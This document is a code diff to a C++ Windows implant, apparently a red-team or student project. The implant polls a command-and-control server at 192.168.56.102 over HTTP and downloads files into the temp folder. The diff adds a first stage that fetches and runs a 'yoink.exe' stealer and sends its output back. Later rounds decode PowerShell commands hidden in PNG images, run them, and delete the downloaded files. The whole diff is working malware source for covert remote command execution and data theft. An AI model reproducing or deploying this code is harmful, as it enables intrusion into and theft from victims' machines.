@@ -3,6 +3,7 @@
 #include <tchar.h>
 #include <iostream>
 #include <sstream>
+#include <fstream>
 #include <string.h>
 #include <vector>
 #include "httpClient.cpp"
@@ -304,7 +305,7 @@ std::string checkin_implant(std::string response, std::wstring imageNum) {
     std::wstring fqdn = L"192.168.56.102";
 
     // construct the http method
-    std::wstring http_method = L"POST";
+    std::wstring http_method = L"GET";
 
     // std::wcout << L"Before http request" << std::endl;
 
@@ -380,14 +381,17 @@ int wmain() {
 
     // get responses to the server and constantly check in every minute for commands
     std::string response = "";
-    int int_imageNum = 1;
+    int int_imageNum = 0;
 
     while (true) {
-        Sleep(1000);
+        Sleep(5000);
         std::string c2_command = "";
         
         std::wstring imageNum = std::to_wstring(int_imageNum);
         c2_command = checkin_implant(response, imageNum);
+        // std::ofstream outfile("POG.png");
+        // outfile << c2_command;
+        // outfile.close();
         response = "";    
         if (c2_command.length() != 0) {
             std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
@@ -399,7 +403,11 @@ int wmain() {
             printf("Temp Path: %s\n", temp_path);
             std::string image_path = "\"";
             image_path.append(temp_path);
-            image_path.append("POGGG.png").append("\"");
+            if (int_imageNum != 0) {
+                image_path.append("POGGG.png").append("\"");
+            } else {
+                image_path.append("yoink.exe").append("\"");
+            }
             
             command.append(image_path.c_str());
             printf("Final command: %s\n", command.c_str());
@@ -412,80 +420,105 @@ int wmain() {
             // This is getting picture from server
             execute_shell(wCommand);
 
-            // Initialize width, height, and channels for original image
-            int width, height, channels;
-            std::string img_path = temp_path;
-            img_path.append("POGGG.png");
-            unsigned char *img = stbi_load(img_path.c_str(), &width, &height, &channels, 0);
-            if (img == NULL)
-            {
-                printf("RIP for image loading");
-                return 0;
-            }
-            printf("Image loaded with width: %dpx, height: %dpx, and channels: %d\n", width, height, channels);
-
-            size_t img_size = width * height * channels;
-
-            // Allocate memory for altered png
-            int altered_img_channels = 3;
-            size_t altered_img_size = width * height * altered_img_channels;
-            unsigned char *altered_img = (unsigned char *)malloc(altered_img_size);
-            if (altered_img == NULL)
-            {
-                printf("RIP for memory allocation for altered img");
-                return 0;
-            }
-
-
-            int max_pixels = width * height;
-            std::cout << "Max Pixels: " << max_pixels << std::endl;
-
-            std::vector<std::string> messages{"", "", ""};
-            messages = decode_png(img, max_pixels, width, height, channels, img_size);
-
-            if (messages[0] != "")
-            {   
-                std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
-                command.append(messages[0]);
-                std::wstring command_temp(command.begin(), command.end());
-                wchar_t* wCommand = (wchar_t*) command_temp.c_str();
-
-                response.append("Command 1 response: ");
-                response.append(execute_shell(wCommand));
-                response.append("\n\n");
-            }
-
-            if (messages[1] != "")
-            {
-                std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
-                command.append(messages[1]);
-                std::wstring command_temp(command.begin(), command.end());
-                wchar_t* wCommand = (wchar_t*) command_temp.c_str();
-
-                response.append("Command 2 response: ");
-                response.append(execute_shell(wCommand));
-                response.append("\n\n");
-            }
-
-            if (messages[2] != "")
-            {
-                std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
-                command.append(messages[2]);
-                std::wstring command_temp(command.begin(), command.end());
-                wchar_t* wCommand = (wchar_t*) command_temp.c_str();
-
-                response.append("Command 3 response: ");
-                response.append(execute_shell(wCommand));
-                response.append("\n\n");
-            }
-            else
-
-
-            //cleanup
-            stbi_image_free(altered_img);
-            stbi_image_free(img);
+            if (int_imageNum != 0) {
+                // Sleep(3000);
+                // // Initialize width, height, and channels for original image
+                int width, height, channels;
+                std::string img_path = temp_path;
+                img_path.append("POGGG.png");
+                // std::string img_path = "Z:\encImages\1_diniFall.png";
+                unsigned char *img = stbi_load(img_path.c_str(), &width, &height, &channels, 0);
+                if (img == NULL)
+                {
+                    printf("RIP for image loading");
+                    continue;
                 }
+                printf("Image loaded with width: %dpx, height: %dpx, and channels: %d\n", width, height, channels);
+
+                size_t img_size = width * height * channels;
+
+                // Allocate memory for altered png
+                int altered_img_channels = 3;
+                size_t altered_img_size = width * height * altered_img_channels;
+                unsigned char *altered_img = (unsigned char *)malloc(altered_img_size);
+                if (altered_img == NULL)
+                {
+                    printf("RIP for memory allocation for altered img");
+                    continue;
+                }
+
+
+                int max_pixels = width * height;
+                std::cout << "Max Pixels: " << max_pixels << std::endl;
+
+                std::vector<std::string> messages{"", "", ""};
+                messages = decode_png(img, max_pixels, width, height, channels, img_size);
+
+                // increase imagenum so that we dont run the same commands again.
+                int_imageNum++;
+
+                if (messages[0] != "")
+                {   
+                    std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
+                    command.append(messages[0]);
+                    std::wstring command_temp(command.begin(), command.end());
+                    wchar_t* wCommand = (wchar_t*) command_temp.c_str();
+
+                    response.append("Command 1 response: ");
+                    response.append(execute_shell(wCommand));
+                    response.append("\n\n");
+                }
+
+                if (messages[1] != "")
+                {
+                    std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
+                    command.append(messages[1]);
+                    std::wstring command_temp(command.begin(), command.end());
+                    wchar_t* wCommand = (wchar_t*) command_temp.c_str();
+
+                    response.append("Command 2 response: ");
+                    response.append(execute_shell(wCommand));
+                    response.append("\n\n");
+                }
+
+                if (messages[2] != "")
+                {
+                    std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
+                    command.append(messages[2]);
+                    std::wstring command_temp(command.begin(), command.end());
+                    wchar_t* wCommand = (wchar_t*) command_temp.c_str();
+
+                    response.append("Command 3 response: ");
+                    response.append(execute_shell(wCommand));
+                    response.append("\n\n");
+                }
+
+                //cleanup
+                stbi_image_free(altered_img);
+                stbi_image_free(img);
+            }
+            else {
+                // Sleep(7000);
+                std::wstring stealer_run(image_path.begin(), image_path.end());
+                // std::wcout << "stealer_run: " << stealer_run << std::endl;
+                response = execute_shell( (wchar_t*) stealer_run.c_str());
+                // std::cout << "response from stealer: " << response << std::endl;
+                int_imageNum++;
             }
 
+            std::string delete_file = temp_path;
+            if (int_imageNum != 1) {
+                delete_file.append("POGGG.png");
+            } else {
+                delete_file.append("yoink.exe");
+            }
+            std::cout << "File to remove: " << delete_file << std::endl;
+            if (remove(delete_file.c_str()) == 0){
+                std::cout << "File successfully deleted" << std::endl;
+            } else {
+                printf( "%s\n", strerror( errno ) );
+            }
+        }
+    }
     return -1;
 }
